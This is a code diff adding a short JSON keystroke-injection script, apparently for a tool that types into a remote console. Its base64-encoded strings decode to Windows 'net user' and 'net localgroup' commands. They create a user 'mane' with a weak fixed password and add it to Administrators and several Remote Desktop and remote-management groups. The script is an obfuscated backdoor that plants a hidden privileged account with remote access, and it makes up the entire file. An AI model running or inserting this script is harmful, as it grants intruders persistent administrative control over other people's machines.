@@ -1,0 +1,20 @@
+[
+        {"send-string-b64":"bmV0IHVzZXIgbWFuZSBQQHNzdzByZCAvYWRk"},
+        {"send-key":"Enter"},
+        {"sleep":"1"},
+        {"send-string-b64":"bmV0IGxvY2FsZ3JvdXAgIkFkbWluaXN0cmF0b3JzIiBtYW5lIC9hZGQ="},
+        {"send-key":"Enter"},
+        {"sleep":"1"},
+        {"send-string-b64":"bmV0IGxvY2FsZ3JvdXAgIlJlbW90ZSBEZXNrdG9wIFVzZXJzIiBtYW5lIC9hZGQ="},
+        {"send-key":"Enter"},
+        {"sleep":"1"},
+        {"send-string-b64":"bmV0IGxvY2FsZ3JvdXAgIlJlbW90ZSBNYW5hZ2VtZW50IFVzZXJzIiBtYW5lIC9hZGQ="},
+        {"send-key":"Enter"},
+        {"sleep":"1"},
+        {"send-string-b64":"bmV0IGxvY2FsZ3JvdXAgIlJEUyBNYW5hZ2VtZW50IFNlcnZlcnMiIG1hbmUgL2FkZA=="},
+        {"send-key":"Enter"},
+        {"sleep":"1"},
+        {"send-string-b64":"bmV0IGxvY2FsZ3JvdXAgIlJEUyBSZW1vdGUgQWNjZXNzIFNlcnZlcnMiIG1hbmUgL2FkZA=="},
+        {"send-key":"Enter"},
+        {"sleep":"1"}
+]
